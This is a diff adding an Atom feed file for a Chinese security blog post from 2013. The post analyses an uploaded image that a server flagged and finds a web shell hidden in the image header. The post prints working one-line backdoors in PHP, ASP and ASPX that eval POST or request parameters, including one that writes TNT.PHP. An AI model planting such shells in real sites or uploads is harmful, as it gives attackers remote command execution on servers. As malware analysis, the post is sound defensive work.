@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Eleven.I386's Blog</title><link href="http://eleveni386.7axu.com/" rel="alternate"></link><link href="http://eleveni386.7axu.com/feeds/mu-ma-bing-du.atom.xml" rel="self"></link><id>http://eleveni386.7axu.com/</id><updated>2013-08-11T00:00:00+08:00</updated><entry><title>图片后门分析</title><link href="http://eleveni386.7axu.com/posts/2013/08/11/tu-pian-hou-men-fen-xi/" rel="alternate"></link><updated>2013-08-11T00:00:00+08:00</updated><author><name>eleven.i386</name></author><id>tag:eleveni386.7axu.com,2013-08-11:posts/2013/08/11/tu-pian-hou-men-fen-xi/</id><summary type="html">&lt;p&gt;就在刚才, 我们服务器拦截一个用户上传的图片, 有php.hide类型的木马问题, 
+我将图片抓到本地pc上改名为xx, 然后上传到http://www.virscan.org/ 进行多病毒库扫描, 
+发现只有clamav报毒, (我本地pc用的也是它) 我先确定这家伙都是不是图片.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="n"&gt;xx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;png&lt;/span&gt;
+    &lt;span class="n"&gt;xx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;jpg&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;JPEG&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;JFIF&lt;/span&gt; &lt;span class="n"&gt;standard&lt;/span&gt; 1&lt;span class="p"&gt;.&lt;/span&gt;01
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;很好,这货还是一张图片, 再看看这个图片隐藏了啥木马,一般人都喜欢往图片的尾巴上插入内容,&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tail -n 10 xx.png&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="/image/DeepinScrot-2016-300x70.png" /&gt;&lt;/p&gt;
+&lt;p&gt;好吧,这货看上去很无辜的样子, 但是咱很相信&lt;strong&gt;clamav&lt;/strong&gt;的说 :-),  &lt;strong&gt;clamv&lt;/strong&gt;既然说
+这货不干净,那么就肯定有什么奇怪的东西混进去了, 那就看看图片头部上有啥东西&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;head -n 1 xx.png&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="/image/DeepinScrot-2239-300x19.png" /&gt;&lt;/p&gt;
+&lt;p&gt;嘿嘿,看见了么, 我们发现了一只奇怪的字符串呢, 在这里 就在这里&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt;&amp;lt;?fputs(fopen(&amp;quot;TNT.PHP&amp;quot;,&amp;quot;w&amp;quot;),&amp;quot;&amp;lt;?eval(\$_POST[TNT]);?&amp;gt;&amp;quot;)?&amp;gt;&amp;quot;&lt;/span&gt;
+&lt;span class="cp"&gt;&amp;lt;%&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TNT&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="cp"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&amp;lt;?php eval($_POST[TNT]);?&amp;gt; &lt;/span&gt;
+&lt;span class="cp"&gt;&amp;lt;%&lt;/span&gt; &lt;span class="vi"&gt;@Page&lt;/span&gt; &lt;span class="no"&gt;Language&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Jscript&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;%&amp;gt;&amp;lt;%&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="no"&gt;Request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Item&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TNT&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;unsafe&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="cp"&gt;%&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;�&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;到此分析就结束了, 没啥技术含量,但是做这个木马的人 更没有技术含量… &lt;/p&gt;</summary><category term="吐槽"></category><category term="安全"></category><category term="木马"></category><category term="病毒"></category></entry></feed>
